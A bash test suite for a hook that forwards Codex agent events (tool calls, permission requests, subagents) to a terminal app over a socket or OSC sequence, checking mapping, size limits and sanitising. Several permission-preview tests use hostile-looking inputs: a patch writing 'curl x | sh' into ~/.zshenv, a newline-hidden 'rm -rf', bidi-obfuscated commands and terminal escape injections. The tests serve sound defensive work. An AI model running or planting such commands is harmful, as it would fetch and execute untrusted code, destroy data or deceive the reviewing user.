#!/bin/bash
# Plain-bash tests for bin/haunt-codex-hook. Needs jq, nc and perl. Usage: tests/run.sh
set -u

HERE="$(cd "$(dirname "$0")" && pwd)"
HOOK="$HERE/../bin/haunt-codex-hook"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT
# Running inside haunt must not leak its socket into the tests.
unset HAUNT_SOCK HAUNT_SURFACE_ID
PREFIX=$'\e]777;notify;haunt://cli-agent;'
PASS=0
FAIL=0

ok() { PASS=$((PASS + 1)); printf 'ok   %s\n' "$1"; }
bad() { FAIL=$((FAIL + 1)); printf 'FAIL %s\n' "$1"; [ -n "${2:-}" ] && printf '     %s\n' "$2"; }

# A perl listener stands in for haunt: one connection, never writes back, prints what arrived.
listen() {
    rm -f "$TMP/s" "$TMP/got"
    perl -MIO::Socket::UNIX -e 'alarm 10; $s = IO::Socket::UNIX->new(Type => SOCK_STREAM(), Local => $ARGV[0], Listen => 1) or die; $c = $s->accept; print while sysread($c, $_, 65536)' "$TMP/s" > "$TMP/got" &
    LPID=$!
    for _ in $(seq 50); do [ -S "$TMP/s" ] && return 0; sleep 0.05; done
    return 1
}

# run <stdin> [args...]: runs the hook against a fresh socket and prints each line it sent.
# Codex feeds some hook stdout to the model, so stdout and the tty must stay empty.
run() {
    local input="$1"; shift
    listen || { echo "NO-LISTENER"; return; }
    printf '%s' "$input" | HAUNT="${T_HAUNT-1}" HAUNT_HOOK_NONCE="${T_NONCE-n0nce}" HAUNT_HOOK_SOCK_MAX="${T_MAX-60000}" \
        HAUNT_SOCK="$TMP/s" HAUNT_SURFACE_ID=surf1 HAUNT_HOOK_TTY="$TMP/sock-tty" "$HOOK" "$@" > "$TMP/out"
    kill -0 "$LPID" 2> /dev/null && nc -U "$TMP/s" < /dev/null > /dev/null 2>&1
    wait "$LPID"
    { [ -s "$TMP/out" ] || [ -e "$TMP/sock-tty" ]; } && echo "WROTE-OUTSIDE-SOCKET"
    cat "$TMP/got"
}

# osc <stdin> [args...]: runs the hook with no socket and prints each OSC body written to the tty.
osc() {
    local input="$1"; shift
    rm -f "$TMP/tty"
    printf '%s' "$input" | HAUNT=1 HAUNT_HOOK_NONCE=n0nce HAUNT_SURFACE_ID=surf1 HAUNT_HOOK_TTY="$TMP/tty" "$HOOK" "$@" > "$TMP/out"
    [ -s "$TMP/out" ] && echo "WROTE-STDOUT"
    [ -s "$TMP/tty" ] || return 0
    tr '\a' '\n' < "$TMP/tty" | while IFS= read -r seq; do
        [ -z "$seq" ] && continue
        case "$seq" in
            "$PREFIX"*) printf '%s\n' "${seq#"$PREFIX"}" ;;
            *) printf 'BAD-PREFIX\n' ;;
        esac
    done
}

# check <name> <stdin> <jq filter over the array of bodies that must be true> [hook args...]
check() {
    local name="$1" input="$2" filter="$3" got; shift 3
    got=$(${RUN-run} "$input" "$@" | jq -sc '.' 2>&1)
    if printf '%s' "$got" | jq -e "$filter" > /dev/null 2>&1; then ok "$name"; else bad "$name" "$got"; fi
}

C='"session_id":"s1","cwd":"/w","transcript_path":null,"model":"gpt-5.5","permission_mode":"default"'
T="$C,\"turn_id\":\"t1\""
E="(.[0] | .v == 1 and .agent == \"codex\" and .session_id == \"s1\" and .cwd == \"/w\" and .nonce == \"n0nce\" and .surface_id == \"surf1\")"
PATCH='*** Begin Patch\n*** Update File: src/a.rs\n@@\n-x\n+y\n*** Add File: /abs/b.rs\n+z\n*** Delete File: old.txt\n*** End Patch\n'

for f in "$HOOK" "$0"; do
    if bash -n "$f"; then ok "bash -n $(basename "$f")"; else bad "bash -n $(basename "$f")"; fi
done

# Every mapped event.
check "SessionStart -> session_start" "{$C,\"hook_event_name\":\"SessionStart\",\"source\":\"startup\"}" \
    "length == 1 and $E and .[0].event == \"session_start\" and .[0].model == \"gpt-5.5\" and .[0].source == \"startup\" and .[0].permission_mode == \"default\" and .[0].plugin_version == \"0.1.0\""
check "UserPromptSubmit -> prompt_submit" "{$T,\"hook_event_name\":\"UserPromptSubmit\",\"prompt\":\"fix the bug\"}" \
    "length == 1 and $E and .[0].event == \"prompt_submit\" and .[0].query == \"fix the bug\" and (.[0] | has(\"turn_id\") | not)"
check "UserPromptSubmit inside a subagent is dropped" "{$T,\"hook_event_name\":\"UserPromptSubmit\",\"agent_id\":\"th2\",\"agent_type\":\"explorer\",\"prompt\":\"subtask\"}" \
    "length == 0"
check "PreToolUse Bash -> tool_start" "{$T,\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"Bash\",\"tool_use_id\":\"call_1\",\"tool_input\":{\"command\":\"cargo test\",\"description\":\"x\"}}" \
    "length == 1 and $E and .[0].event == \"tool_start\" and .[0].tool_name == \"Bash\" and .[0].tool_use_id == \"call_1\" and .[0].tool_input == {command:\"cargo test\"}"
check "PreToolUse apply_patch -> tool_start with every file in patch order, absolute" "{$T,\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"apply_patch\",\"tool_use_id\":\"call_2\",\"tool_input\":{\"command\":\"$PATCH\"}}" \
    "length == 1 and .[0].event == \"tool_start\" and .[0].tool_input == {file_path:\"/w/src/a.rs\n/abs/b.rs\n/w/old.txt\"}"
check "PreToolUse spawn_agent -> tool_start + subagent_spawn (default role)" "{$T,\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"spawn_agent\",\"tool_use_id\":\"call_3\",\"tool_input\":{\"message\":\"trace the hooks\\nin detail\"}}" \
    "map(.event) == [\"tool_start\",\"subagent_spawn\"] and .[1].agent_type == \"default\" and .[1].description == \"trace the hooks\" and .[1].nonce == \"n0nce\""
check "PreToolUse spawn_agent prefers task_name and keeps agent_type" "{$T,\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"spawn_agent\",\"tool_use_id\":\"call_3\",\"tool_input\":{\"agent_type\":\"explorer\",\"task_name\":\"map_hooks\",\"message\":\"m\"}}" \
    ".[1] | .agent_type == \"explorer\" and .description == \"map_hooks\""
check "PreToolUse spawn_agent without a message has no description" "{$T,\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"spawn_agent\",\"tool_input\":{\"items\":[]}}" \
    ".[1].event == \"subagent_spawn\" and (.[1] | has(\"description\") | not)"
check "PreToolUse request_user_input -> tool_start + question_asked" "{$T,\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"request_user_input\",\"tool_use_id\":\"call_4\",\"tool_input\":{\"questions\":[]}}" \
    "map(.event) == [\"tool_start\",\"question_asked\"] and .[0].tool_input == {}"
check "PreToolUse MCP tool with string input -> empty preview" "{$T,\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"mcp__fs__read\",\"tool_use_id\":\"call_5\",\"tool_input\":\"not an object\"}" \
    "length == 1 and .[0].tool_input == {}"
check "PreToolUse non-string preview fields are dropped" "{$T,\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"x\",\"tool_input\":{\"command\":[\"ls\"],\"url\":\"https://x.dev\"}}" \
    ".[0].tool_input == {url:\"https://x.dev\"}"
check "PostToolUse Bash -> tool_done + tool_ran" "{$T,\"hook_event_name\":\"PostToolUse\",\"tool_name\":\"Bash\",\"tool_use_id\":\"call_1\",\"tool_input\":{\"command\":\"ls\"},\"tool_response\":\"a\\nb\"}" \
    "length == 2 and $E and map(.event) == [\"tool_done\",\"tool_ran\"] and all(.[]; .tool_input == {command:\"ls\"} and .tool_use_id == \"call_1\")"
check "PostToolUse url only in tool_done" "{$T,\"hook_event_name\":\"PostToolUse\",\"tool_name\":\"mcp__web__fetch\",\"tool_input\":{\"url\":\"https://x\"},\"tool_response\":{}}" \
    "map(.event) == [\"tool_done\",\"tool_ran\"] and .[0].tool_input == {url:\"https://x\"} and .[1].tool_input == {}"
check "PostToolUse apply_patch -> file_edited per file + tool_done + tool_ran" "{$T,\"hook_event_name\":\"PostToolUse\",\"tool_name\":\"apply_patch\",\"tool_use_id\":\"call_2\",\"tool_input\":{\"command\":\"$PATCH\"},\"tool_response\":\"Success\"}" \
    "map(.event) == [\"file_edited\",\"file_edited\",\"file_edited\",\"tool_done\",\"tool_ran\"] and ([.[0:3][].tool_input.file_path] | sort) == [\"/abs/b.rs\",\"/w/old.txt\",\"/w/src/a.rs\"] and all(.[0:3][]; .tool_name == \"apply_patch\") and .[4].tool_input == {file_path:\"/w/src/a.rs\n/abs/b.rs\n/w/old.txt\"}"
MANY=$(for i in $(seq 30); do printf '*** Add File: f%02d\\n+x\\n' "$i"; done)
check "PostToolUse apply_patch caps file_edited at 20" "{$T,\"hook_event_name\":\"PostToolUse\",\"tool_name\":\"apply_patch\",\"tool_input\":{\"command\":\"$MANY\"}}" \
    "([.[] | select(.event == \"file_edited\")] | length) == 20"
check "PostToolUse update_plan -> todos_written" "{$T,\"hook_event_name\":\"PostToolUse\",\"tool_name\":\"update_plan\",\"tool_use_id\":\"call_6\",\"tool_input\":{\"plan\":[{\"step\":\"a\",\"status\":\"completed\"},{\"step\":\"b\",\"status\":\"in_progress\"},{\"step\":\"c\",\"status\":\"pending\"}]},\"tool_response\":\"Plan updated\"}" \
    "$E and .[0].event == \"todos_written\" and .[0].tool_count == 3 and .[0].todos_done == 1 and map(.event) == [\"todos_written\",\"tool_done\",\"tool_ran\"]"
check "PostToolUse update_plan with a bad plan still counts" "{$T,\"hook_event_name\":\"PostToolUse\",\"tool_name\":\"update_plan\",\"tool_input\":{\"plan\":\"x\"}}" \
    ".[0].event == \"todos_written\" and .[0].tool_count == 0"
check "PostToolUse spawn_agent emits no subagent_result" "{$T,\"hook_event_name\":\"PostToolUse\",\"tool_name\":\"spawn_agent\",\"tool_input\":{\"message\":\"m\"},\"tool_response\":{\"agent_id\":\"th2\"}}" \
    "map(.event) == [\"tool_done\",\"tool_ran\"]"
check "PostToolUse inside a subagent -> subagent_tool" "{$T,\"hook_event_name\":\"PostToolUse\",\"agent_id\":\"th2\",\"agent_type\":\"explorer\",\"tool_name\":\"Bash\",\"tool_use_id\":\"c9\",\"tool_input\":{\"command\":\"rg x\"}}" \
    "map(.event) == [\"tool_done\",\"tool_ran\",\"subagent_tool\"] and .[2].tool_name == \"Bash\" and .[2].agent_id == \"th2\" and .[2].agent_type == \"explorer\""
check "PermissionRequest Bash -> permission_seen" "{$T,\"hook_event_name\":\"PermissionRequest\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git push\",\"description\":\"push it\"}}" \
    "length == 1 and $E and .[0].event == \"permission_seen\" and .[0].tool_name == \"Bash\" and .[0].tool_input == {command:\"git push\"} and (.[0] | has(\"tool_use_id\") | not)"
check "PermissionRequest apply_patch -> permission_seen with every file" "{$T,\"hook_event_name\":\"PermissionRequest\",\"tool_name\":\"apply_patch\",\"tool_input\":{\"command\":\"$PATCH\"}}" \
    ".[0].event == \"permission_seen\" and .[0].tool_input == {file_path:\"/w/src/a.rs\n/abs/b.rs\n/w/old.txt\"}"
# A patch that edits a workspace file and adds a dotfile outside it must show both, the way the patch orders them.
ESCAPE='*** Begin Patch\n*** Update File: src/zz_main.rs\n@@\n-a\n+b\n*** Add File: /Users/me/.zshenv\n+curl x | sh\n*** End Patch\n'
check "PermissionRequest apply_patch outside the workspace shows every path" "{$T,\"hook_event_name\":\"PermissionRequest\",\"tool_name\":\"apply_patch\",\"tool_input\":{\"command\":\"$ESCAPE\"}}" \
    ".[0].tool_input == {file_path:\"/w/src/zz_main.rs\n/Users/me/.zshenv\"}"
check "PermissionRequest apply_patch shows a rename target, each path once" "{$T,\"hook_event_name\":\"PermissionRequest\",\"tool_name\":\"apply_patch\",\"tool_input\":{\"command\":\"*** Update File: a.rs\n*** Move to: /etc/b.rs\n*** Update File: a.rs\n\"}}" \
    ".[0].tool_input == {file_path:\"/w/a.rs\n/etc/b.rs\"}"
check "PermissionRequest apply_patch with one file sends just it" "{$T,\"hook_event_name\":\"PermissionRequest\",\"tool_name\":\"apply_patch\",\"tool_input\":{\"command\":\"*** Update File: src/a.rs\n@@\n-x\n+y\n\"}}" \
    ".[0].tool_input == {file_path:\"/w/src/a.rs\"}"
check "PermissionRequest apply_patch reads indented headers as Codex does" "{$T,\"hook_event_name\":\"PermissionRequest\",\"tool_name\":\"apply_patch\",\"tool_input\":{\"command\":\"*** Update File: src/a.rs\n@@\n-x\n+y\n   *** Add File: /etc/evil\n+z\n\"}}" \
    ".[0].tool_input == {file_path:\"/w/src/a.rs\n/etc/evil\"}"
check "PermissionRequest apply_patch with an unreadable *** line is never a one-file edit" "{$T,\"hook_event_name\":\"PermissionRequest\",\"tool_name\":\"apply_patch\",\"tool_input\":{\"command\":\"*** Update File: src/a.rs\n@@\n-x\n+y\n***Add  File:evil\n\"}}" \
    ".[0].tool_input.file_path | contains(\"\n\")"
check "PermissionRequest apply_patch naming no file sends no path" "{$T,\"hook_event_name\":\"PermissionRequest\",\"tool_name\":\"apply_patch\",\"tool_input\":{\"command\":\"garbage\"}}" \
    ".[0].tool_input == {}"
check "SubagentStart -> subagent_start" "{$T,\"hook_event_name\":\"SubagentStart\",\"agent_id\":\"th2\",\"agent_type\":\"default\"}" \
    "length == 1 and $E and .[0].event == \"subagent_start\" and .[0].agent_id == \"th2\" and .[0].agent_type == \"default\""
check "SubagentStop -> subagent_stop" "{$T,\"hook_event_name\":\"SubagentStop\",\"agent_id\":\"th2\",\"agent_type\":\"default\",\"stop_hook_active\":false,\"last_assistant_message\":\"secret\",\"agent_transcript_path\":null}" \
    "length == 1 and .[0].event == \"subagent_stop\" and .[0].agent_id == \"th2\" and (tojson | contains(\"secret\") | not)"
check "Stop -> stop" "{$T,\"hook_event_name\":\"Stop\",\"stop_hook_active\":false,\"last_assistant_message\":\"all done\"}" \
    "length == 1 and $E and .[0].event == \"stop\" and (.[0] | has(\"last_assistant_message\") or has(\"stop_hook_active\") | not)"
check "Interrupt -> stop" "{$T,\"hook_event_name\":\"Interrupt\"}" "length == 1 and .[0].event == \"stop\""
NOTIFY='{"type":"agent-turn-complete","thread-id":"th1","turn-id":"t9","cwd":"/w","client":"codex-tui","input-messages":["do it"],"last-assistant-message":"done"}'
check "notify agent-turn-complete -> stop" "" \
    "length == 1 and .[0] == {v:1, agent:\"codex\", event:\"stop\", surface_id:\"surf1\", session_id:\"th1\", cwd:\"/w\", nonce:\"n0nce\"}" notify "$NOTIFY"
check "notify ignores stdin" '{"hook_event_name":"PreToolUse","tool_name":"Bash"}' "length == 1 and .[0].event == \"stop\"" notify "$NOTIFY"
check "notify of another type emits nothing" "" "length == 0" notify '{"type":"approval-requested"}'
check "notify without a payload emits nothing" "" "length == 0" notify
for ev in PreCompact PostCompact SessionEnd Bogus; do
    check "$ev emits nothing" "{$T,\"hook_event_name\":\"$ev\",\"trigger\":\"auto\"}" "length == 0"
done
check "no hook_event_name emits nothing" "{$T}" "length == 0"
check "invalid stdin emits nothing" 'not json' "length == 0"
check "null fields are dropped" '{"hook_event_name":"Stop","session_id":"s1","cwd":null}' \
    ".[0] | keys == [\"agent\",\"event\",\"nonce\",\"session_id\",\"surface_id\",\"v\"]"

# Nonce.
T_NONCE="" check "nonce absent when HAUNT_HOOK_NONCE empty" "{$T,\"hook_event_name\":\"Stop\"}" "length == 1 and (.[0] | has(\"nonce\") | not)"
if grep -q '\$HAUNT_HOOK_NONCE\|"\$HAUNT_HOOK_NONCE"' "$HOOK"; then bad "nonce read via \$ENV only, never on a command line"; else ok "nonce read via \$ENV only, never on a command line"; fi
if sed -n '/^```toml/,/^```/p' "$HERE/../README.md" | grep -q 'NONCE'; then bad "config snippet carries no nonce"; else ok "config snippet carries no nonce"; fi

# HAUNT gating.
T_HAUNT="" check "no output when HAUNT unset" "{$T,\"hook_event_name\":\"Stop\"}" "length == 0"
T_HAUNT="0" check "no output when HAUNT=0" "{$T,\"hook_event_name\":\"Stop\"}" "length == 0"
T_HAUNT="0" check "no output for notify when HAUNT=0" "" "length == 0" notify "$NOTIFY"
printf '{"hook_event_name":"Stop"}' | env -u HAUNT HAUNT_HOOK_TTY="$TMP/tty0" "$HOOK" > "$TMP/out"
if [ ! -s "$TMP/out" ] && [ ! -e "$TMP/tty0" ]; then ok "HAUNT unset writes neither stdout nor tty"; else bad "HAUNT unset writes neither stdout nor tty"; fi

# Control and format characters.
CTRL='"tool_name":"Bash","tool_use_id":"c\u0007u","tool_input":{"command":"echo \u001b]777;notify;haunt://cli-agent;{}\u0007 \u009b31m\nnext\tx\u007f"}'
check "control characters stripped from every string but tool_input, which goes raw" "{$T,\"hook_event_name\":\"PostToolUse\",$CTRL}" \
    "length == 2 and .[0].tool_input.command == \"echo \u001b]777;notify;haunt://cli-agent;{}\u0007 \u009b31m\nnext\tx\u007f\" and .[0].tool_use_id == \"cu\""
check "control characters stripped from prompt" "{$T,\"hook_event_name\":\"UserPromptSubmit\",\"prompt\":\"a\u0000b\u001bc\"}" ".[0].query == \"abc\""
# haunt shows what a stripped preview would hide: a command whose newline was removed would read as one line.
check "a hidden newline reaches the core" "{$T,\"hook_event_name\":\"PermissionRequest\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"ls #\\nrm -rf ~/x\"}}" \
    ".[0].tool_input.command == \"ls #\nrm -rf ~/x\""
check "format characters (bidi, zero-width, tags) reach the core in tool_input" "{$T,\"hook_event_name\":\"PermissionRequest\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"echo \\u202e\\u2066/ fr- mr\\u2069\\u200b\\u200f\\u2060\\ufeff\\u00ad\\udb40\\udc41x\"}}" \
    ".[0].tool_input.command == \"echo \u202e\u2066/ fr- mr\u2069\u200b\u200f\u2060\ufeff\u00ad\udb40\udc41x\""
check "format characters reach the core in patch paths" "{$T,\"hook_event_name\":\"PermissionRequest\",\"tool_name\":\"apply_patch\",\"tool_input\":{\"command\":\"*** Update File: /w/\\u202ecod.exe\\n\"}}" \
    ".[0].tool_input.file_path == \"/w/\u202ecod.exe\""
check "format characters stripped outside tool_input" "{$T,\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"Ba\\u202esh\",\"tool_input\":{}}" ".[0].tool_name == \"Bash\""
check "control characters stripped from notify" "" ".[0].cwd == \"/w[2Jx\"" notify '{"type":"agent-turn-complete","thread-id":"th1","cwd":"/w\u001b[2Jx"}'
raw=$(run '{"hook_event_name":"UserPromptSubmit","session_id":"s1","prompt":"a\u001b[2Jb\u0085c"}')
if LC_ALL=C grep -q '[[:cntrl:]]' <<< "$raw" || printf '%s' "$raw" | grep -q '\\u00' || [[ "$raw" == *$'\xc2\x85'* ]]; then
    bad "socket line contains no control bytes or escapes" "$(printf '%s' "$raw" | cat -v)"
else
    ok "socket line contains no control bytes or escapes"
fi

# C1 controls (U+0080-009F) in tool_input reach the socket as \u escapes: jq leaves them raw, and
# the core drops any line holding a raw control character.
c1_input() { printf '%s' "{$T,\"hook_event_name\":\"PermissionRequest\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$1\"}}"; }
raw=$(run "$(c1_input 'a\u0085b\u009b31mc\u0080')")
if [ -n "$raw" ] && ! printf '%s' "$raw" | LC_ALL=C perl -ne 'exit 1 if /\xc2[\x80-\x9f]|[\x00-\x1f\x7f]/' ; then
    bad "C1 controls leave no raw control bytes" "$(printf '%s' "$raw" | od -c | head -5)"
elif [[ "$raw" == *'\u0085b\u009b31mc\u0080'* ]] && [ "$(printf '%s' "$raw" | jq -r '.tool_input.command')" = $'a\xc2\x85b\xc2\x9b31mc\xc2\x80' ]; then
    ok "C1 controls leave no raw control bytes and decode to the same command"
else
    bad "C1 controls leave no raw control bytes and decode to the same command" "$raw"
fi
C1S=$(for _ in $(seq 800); do printf '\\u0085'; done)
raw=$(T_MAX=2000 run "$(c1_input "$C1S")")
n=$(printf '%s' "$raw" | wc -c | tr -d ' ')
if [ "$n" -le 2000 ] && [ "$n" -gt 1800 ] && [ "$(printf '%s' "$raw" | jq -r '.truncated')" = true ]; then
    ok "escaped C1 counts toward the line limit ($n bytes)"
else
    bad "escaped C1 counts toward the line limit" "$n bytes"
fi

# Socket size limit.
BIG=$(head -c 6000 /dev/zero | tr '\0' 'x')
HUGE=$(head -c 70000 /dev/zero | tr '\0' 'x')
WIDE=$(for _ in $(seq 1500); do printf 'é'; done)
size() { run "$1" | while IFS= read -r b; do printf '%s' "$b" | wc -c | tr -d ' '; done; }
check "6 KB command is not truncated" "{$T,\"hook_event_name\":\"PermissionRequest\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$BIG\"}}" \
    ".[0].tool_input.command == \"$BIG\" and (.[0] | has(\"truncated\") | not)"
for ev in PreToolUse PostToolUse PermissionRequest; do
    max=$(size "{$T,\"hook_event_name\":\"$ev\",\"tool_name\":\"Bash\",\"tool_use_id\":\"c-huge\",\"tool_input\":{\"command\":\"$HUGE\"}}" | sort -n | tail -1)
    if [ "$max" -le 60000 ]; then ok "$ev 70 KB command fits a 64 KB line ($max bytes)"; else bad "$ev 70 KB command fits" "$max bytes"; fi
done
max=$(size "{$T,\"hook_event_name\":\"PostToolUse\",\"tool_name\":\"apply_patch\",\"tool_input\":{\"command\":\"*** Update File: $HUGE\\n\"}}" | sort -n | tail -1)
if [ "$max" -le 60000 ]; then ok "70 KB patch path fits a 64 KB line ($max bytes)"; else bad "70 KB patch path fits" "$max bytes"; fi
check "truncated command keeps ids, nonce and event" "{$T,\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"Bash\",\"tool_use_id\":\"c-huge\",\"tool_input\":{\"command\":\"$HUGE\"}}" \
    "$E and .[0].event == \"tool_start\" and .[0].tool_use_id == \"c-huge\" and .[0].truncated == true and (.[0].tool_input.command | endswith(\"…\") and length > 59000)"
check "small payload is not marked truncated" "{$T,\"hook_event_name\":\"Stop\"}" ".[0] | has(\"truncated\") | not"
T_MAX=2000 check "multibyte prompt truncated by bytes" "{$T,\"hook_event_name\":\"UserPromptSubmit\",\"prompt\":\"$WIDE\"}" \
    ".[0].truncated == true and (.[0].query | endswith(\"…\")) and (.[0] | tojson | utf8bytelength) <= 2000"
T_MAX=2000 check "oversized non-bulky field falls back to the minimal envelope" "{$T,\"hook_event_name\":\"SessionStart\",\"source\":\"$BIG\"}" \
    "length == 1 and .[0] == {v:1, agent:\"codex\", event:\"session_start\", surface_id:\"surf1\", session_id:\"s1\", nonce:\"n0nce\", truncated:true}"
T_MAX=2000 check "event whose ids overflow is dropped" "{\"hook_event_name\":\"Stop\",\"session_id\":\"$BIG\"}" "length == 0"

# A socket that is there but refuses the send drops the event: the authenticated path is never downgraded.
listen && kill "$LPID" 2> /dev/null; wait "$LPID" 2> /dev/null
printf '{"hook_event_name":"Stop","session_id":"s1"}' | HAUNT=1 HAUNT_SOCK="$TMP/s" HAUNT_SURFACE_ID=surf1 HAUNT_HOOK_TTY="$TMP/dead-tty" "$HOOK" > "$TMP/out"
if [ -S "$TMP/s" ] && [ ! -s "$TMP/out" ] && [ ! -e "$TMP/dead-tty" ]; then ok "dead socket: nothing sent, no OSC"; else bad "dead socket: nothing sent, no OSC" "$(cat "$TMP/out")"; fi
# No nc to send with is a failed send too.
mkdir -p "$TMP/nonc"; ln -sf "$(command -v jq)" "$TMP/nonc/jq"; ln -sf "$(command -v cat)" "$TMP/nonc/cat"
printf '{"hook_event_name":"Stop","session_id":"s1"}' | PATH="$TMP/nonc" HAUNT=1 HAUNT_SOCK="$TMP/s" HAUNT_SURFACE_ID=surf1 HAUNT_HOOK_TTY="$TMP/nonc-tty" "$HOOK" > "$TMP/out"
if [ ! -s "$TMP/out" ] && [ ! -e "$TMP/nonc-tty" ]; then ok "socket but no nc: dropped, no OSC"; else bad "socket but no nc: dropped, no OSC" "$(cat -v "$TMP/nonc-tty" 2>/dev/null)"; fi

# OSC fallback: status fields only, on the tty only.
RUN=osc check "OSC: status fields only" "{$T,\"hook_event_name\":\"PostToolUse\",\"agent_id\":\"th2\",\"agent_type\":\"explorer\",\"tool_name\":\"Bash\",\"tool_use_id\":\"c1\",\"tool_input\":{\"command\":\"ls\"}}" \
    "map(.event) == [\"tool_done\",\"tool_ran\",\"subagent_tool\"] and all(.[]; . == {v:1, agent:\"codex\", event:.event, agent_id:\"th2\", agent_type:\"explorer\", tool_name:\"Bash\"})"
RUN=osc check "OSC: todos survive" "{$T,\"hook_event_name\":\"PostToolUse\",\"tool_name\":\"update_plan\",\"tool_input\":{\"plan\":[{\"status\":\"completed\"},{\"status\":\"pending\"}]}}" \
    ".[0] == {v:1, agent:\"codex\", event:\"todos_written\", tool_name:\"update_plan\", tool_count:2, todos_done:1} or (.[0].event == \"todos_written\" and .[0].tool_count == 2 and .[0].todos_done == 1)"
RUN=osc check "OSC: no nonce, cwd, session, prompt, command or surface_id" "{$T,\"hook_event_name\":\"UserPromptSubmit\",\"prompt\":\"$BIG\"}" \
    ".[0] == {v:1, agent:\"codex\", event:\"prompt_submit\"}"
RUN=osc check "OSC: permission_seen carries no command" "{$T,\"hook_event_name\":\"PermissionRequest\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git push\"}}" \
    ".[0] == {v:1, agent:\"codex\", event:\"permission_seen\", tool_name:\"Bash\"}"
RUN=osc check "OSC: notify" "" ".[0] == {v:1, agent:\"codex\", event:\"stop\"}" notify "$NOTIFY"
RUN=osc check "OSC: a spawn description is cut to fit" "{$T,\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"spawn_agent\",\"tool_input\":{\"task_name\":\"$WIDE\"}}" \
    ".[1].event == \"subagent_spawn\" and .[1].truncated == true and (.[1].description | endswith(\"…\"))"
LONGTYPE=$(head -c 200 /dev/zero | tr '\0' 't')
RUN=osc check "OSC: a long agent_type is dropped to fit" "{$T,\"hook_event_name\":\"SubagentStart\",\"agent_id\":\"th2\",\"agent_type\":\"$LONGTYPE\"}" \
    ".[0] == {v:1, agent:\"codex\", event:\"subagent_start\", agent_id:\"th2\"}"
RUN=osc check "OSC: an event that cannot fit is dropped" "{$T,\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"$LONGTYPE$LONGTYPE\",\"tool_input\":{}}" "length == 0"
RUN=osc check "OSC: control characters stripped" "{$T,\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"Ba\u001b]sh\u0007\",\"tool_input\":{}}" ".[0].tool_name == \"Ba]sh\""
EMOJI=$(for _ in $(seq 700); do printf "\xf0\x9f\x91\xbb"; done)
: > "$TMP/oscall"
for ev in SessionStart UserPromptSubmit PreToolUse PostToolUse PermissionRequest SubagentStart SubagentStop Stop Interrupt; do
    for fill in "$BIG" "$WIDE" "$EMOJI"; do
        for tool in Bash apply_patch spawn_agent update_plan request_user_input; do
            osc "{$T,\"hook_event_name\":\"$ev\",\"agent_id\":\"th2\",\"agent_type\":\"explorer\",\"prompt\":\"$fill\",\"source\":\"$fill\",\"tool_name\":\"$tool\",\"tool_use_id\":\"c1\",\"tool_input\":{\"command\":\"*** Add File: $fill\\n\",\"task_name\":\"$fill\",\"message\":\"$fill\",\"plan\":[{\"status\":\"completed\"}]}}" >> "$TMP/oscall"
        done
    done
done
count=$(wc -l < "$TMP/oscall" | tr -d " ")
over=$(LC_ALL=C awk 'length($0) > 250' "$TMP/oscall" | wc -l | tr -d " ")
invalid=$(while IFS= read -r b; do printf '%s' "$b" | jq -e . > /dev/null 2>&1 || echo x; done < "$TMP/oscall" | wc -l | tr -d " ")
max=$(LC_ALL=C awk '{ if (length($0) > m) m = length($0) } END { print m + 0 }' "$TMP/oscall")
if [ "$count" -gt 100 ] && [ "$over" -eq 0 ] && [ "$invalid" -eq 0 ]; then ok "OSC: $count bodies, all valid JSON, max $max bytes"; else bad "OSC: bodies valid and within 250 bytes" "count $count, over $over, invalid $invalid, max $max"; fi

# OSC delivery: the raw sequence on the tty; with no tty, nothing at all, and never stdout.
printf '{"hook_event_name":"Stop","session_id":"s1"}' | HAUNT=1 HAUNT_HOOK_NONCE=n0nce HAUNT_HOOK_TTY="$TMP/tty1" "$HOOK" > "$TMP/out"
if [ ! -s "$TMP/out" ] && [ "$(cat "$TMP/tty1")" = "$PREFIX"'{"v":1,"agent":"codex","event":"stop"}'$'\a' ]; then
    ok "OSC tty delivery"
else
    bad "OSC tty delivery" "$(cat -v "$TMP/tty1" 2>/dev/null)"
fi
printf '{"hook_event_name":"SessionStart","session_id":"s1"}' | HAUNT=1 HAUNT_HOOK_TTY="$TMP/no/tty" "$HOOK" > "$TMP/out"; rc=$?
if [ ! -s "$TMP/out" ] && [ "$rc" -eq 0 ]; then ok "no tty: nothing on stdout (it would reach the model), exit 0"; else bad "no tty: nothing on stdout" "$(cat "$TMP/out")"; fi

# When the hook falls back to OSC: no socket, a non-socket, or no surface id.
osc_ok() { [ -s "$TMP/ftty" ] && ! grep -q 'surface_id\|nonce' "$TMP/ftty" && [ ! -s "$TMP/out" ]; }
rm -f "$TMP/ftty"
printf '{"hook_event_name":"Stop","session_id":"s1"}' | HAUNT=1 HAUNT_HOOK_NONCE=n0nce HAUNT_SOCK="$TMP/missing" HAUNT_SURFACE_ID=surf1 HAUNT_HOOK_TTY="$TMP/ftty" "$HOOK" > "$TMP/out"
if osc_ok; then ok "fallback: socket missing"; else bad "fallback: socket missing"; fi
rm -f "$TMP/ftty"; : > "$TMP/plain"
printf '{"hook_event_name":"Stop","session_id":"s1"}' | HAUNT=1 HAUNT_HOOK_NONCE=n0nce HAUNT_SOCK="$TMP/plain" HAUNT_SURFACE_ID=surf1 HAUNT_HOOK_TTY="$TMP/ftty" "$HOOK" > "$TMP/out"
if osc_ok; then ok "fallback: HAUNT_SOCK is not a socket"; else bad "fallback: HAUNT_SOCK is not a socket"; fi
rm -f "$TMP/ftty"
printf '{"hook_event_name":"Stop","session_id":"s1"}' | HAUNT=1 HAUNT_HOOK_NONCE=n0nce HAUNT_SOCK="$TMP/s" HAUNT_HOOK_TTY="$TMP/ftty" "$HOOK" > "$TMP/out"
